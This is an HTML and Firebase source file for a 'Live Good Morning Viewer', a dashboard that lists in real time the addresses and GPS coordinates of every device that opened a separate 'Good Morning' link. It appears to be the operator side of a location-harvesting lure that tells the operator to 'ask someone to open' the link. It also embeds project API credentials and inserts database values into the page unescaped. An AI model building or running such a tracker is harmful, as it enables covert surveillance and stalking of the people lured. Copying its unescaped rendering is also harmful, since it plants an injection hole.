<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Live Good Morning Viewer</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
        sans-serif;
      background: #f5f7fb;
      padding: 24px 10px;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
      color: #1f2933;
    }
    .card {
      background: #ffffff;
      padding: 24px 18px 28px;
      border-radius: 18px;
      box-shadow: 0 14px 30px rgba(15, 23, 42, 0.12);
      max-width: 900px;
      width: 100%;
    }
    h1 {
      font-size: 1.7rem;
      margin-bottom: 4px;
      text-align: center;
      color: #f97316;
    }
    .subtitle {
      font-size: 0.95rem;
      text-align: center;
      color: #4b5563;
      margin-bottom: 16px;
    }
    .pill {
      display: inline-block;
      padding: 6px 14px;
      border-radius: 999px;
      background: #fef3c7;
      color: #92400e;
      font-size: 0.8rem;
      text-align: center;
      margin: 4px auto 0;
    }
    .status-bar {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 8px;
      margin: 16px 0;
      font-size: 0.9rem;
    }
    .dot {
      width: 10px;
      height: 10px;
      border-radius: 999px;
      background: #16a34a;
      box-shadow: 0 0 0 4px rgba(22, 163, 74, 0.2);
    }
    .status-text {
      color: #16a34a;
      font-weight: 600;
    }
    .error-text {
      color: #dc2626;
      font-weight: 500;
      text-align: center;
      margin-top: 6px;
      font-size: 0.85rem;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 10px;
      font-size: 0.85rem;
    }
    thead {
      background: #f3f4f6;
    }
    th, td {
      padding: 8px 6px;
      border-bottom: 1px solid #e5e7eb;
      text-align: left;
      vertical-align: middle;
      word-break: break-word;
    }
    th {
      font-weight: 600;
      color: #374151;
      font-size: 0.8rem;
    }
    tbody tr:nth-child(even) {
      background: #fafafa;
    }
    .center {
      text-align: center;
    }
    .device-id {
      font-family: "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo,
        Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
      font-size: 0.8rem;
      color: #111827;
    }
    @media (max-width: 640px) {
      .card {
        padding: 18px 12px 22px;
      }
      h1 {
        font-size: 1.4rem;
      }
      table {
        font-size: 0.78rem;
      }
      th, td {
        padding: 6px 4px;
      }
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>üåç Live Good Morning Viewer</h1>
    <p class="subtitle">
      See all devices that opened the Good Morning page and are sending their live location.
    </p>
    <p class="pill">One row = one device (auto-refreshed from Firebase)</p>

    <div class="status-bar">
      <span class="dot"></span>
      <span id="liveStatus" class="status-text">Waiting for data‚Ä¶</span>
    </div>
    <div id="errorBox" class="error-text" style="display:none;"></div>

    <div style="overflow-x:auto; margin-top: 6px;">
      <table>
        <thead>
          <tr>
            <th>#</th>
            <th>Device ID</th>
            <th>Address / Area</th>
            <th>Latitude</th>
            <th>Longitude</th>
            <th>Accuracy (m)</th>
            <th>Last Updated</th>
          </tr>
        </thead>
        <tbody id="devicesBody">
          <tr>
            <td class="center" colspan="7" id="emptyRow">
              No devices yet. Ask someone to open the Good Morning link.
            </td>
          </tr>
        </tbody>
      </table>
    </div>
  </div>

  <!-- Firebase + viewer logic -->
  <script type="module">
    // --- 1. Import Firebase SDKs (same version as index.html) ---
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
    import {
      getDatabase,
      ref,
      onValue
    } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-database.js";

    // --- 2. Your Firebase config (SAME as index.html) ---
    const firebaseConfig = {
      apiKey: "AIzaSyDBUM7Qzl-KOZJMFUpuDH1CerJdsm_eKFM",
      authDomain: "loc-demo-22c3d.firebaseapp.com",
      databaseURL: "https://loc-demo-22c3d-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "loc-demo-22c3d",
      storageBucket: "loc-demo-22c3d.firebasestorage.app",
      messagingSenderId: "603283450312",
      appId: "1:603283450312:web:7bf9c8a9fde7d0c26778fd"
    };

    const liveStatusEl = document.getElementById("liveStatus");
    const errorBox = document.getElementById("errorBox");
    const tbody = document.getElementById("devicesBody");
    const emptyRow = document.getElementById("emptyRow");

    function showError(msg) {
      errorBox.style.display = "block";
      errorBox.textContent = msg;
    }

    try {
      // --- 3. Init Firebase & RTDB ---
      const app = initializeApp(firebaseConfig);
      const db = getDatabase(app);

      // Reference to /locations (where index.html writes)
      const locationsRef = ref(db, "locations");

      // --- 4. Live listener: rebuild table on every change ---
      onValue(
        locationsRef,
        (snapshot) => {
          // Clear previous rows
          tbody.innerHTML = "";

          if (!snapshot.exists()) {
            liveStatusEl.textContent = "Connected ‚Äî no devices yet";
            const row = document.createElement("tr");
            const cell = document.createElement("td");
            cell.colSpan = 7;
            cell.className = "center";
            cell.textContent =
              "No devices yet. Ask someone to open the Good Morning link.";
            row.appendChild(cell);
            tbody.appendChild(row);
            return;
          }

          let index = 1;
          const devices = [];

          snapshot.forEach((childSnap) => {
            const data = childSnap.val() || {};
            devices.push({
              key: childSnap.key,
              ...data
            });
          });

          // Optional: sort by latest timestamp (newest first)
          devices.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));

          devices.forEach((d) => {
            const tr = document.createElement("tr");

            const lastUpdated =
              d.timestamp
                ? new Date(d.timestamp).toLocaleString()
                : "‚Äì";

            tr.innerHTML = `
              <td>${index++}</td>
              <td class="device-id">${d.deviceId || d.key}</td>
              <td>${d.address || "-"}</td>
              <td>${d.latitude ?? "-"}</td>
              <td>${d.longitude ?? "-"}</td>
              <td>${d.accuracy ?? "-"}</td>
              <td>${lastUpdated}</td>
            `;
            tbody.appendChild(tr);
          });

          liveStatusEl.textContent =
            "LIVE ‚Äì showing " + devices.length + " device(s)";
          errorBox.style.display = "none";
        },
        (error) => {
          showError("Error reading from database: " + error.code);
          liveStatusEl.textContent = "Error";
        }
      );
    } catch (err) {
      showError("Firebase init failed: " + err.message);
      liveStatusEl.textContent = "Error";
    }
  </script>
</body>
          </html>
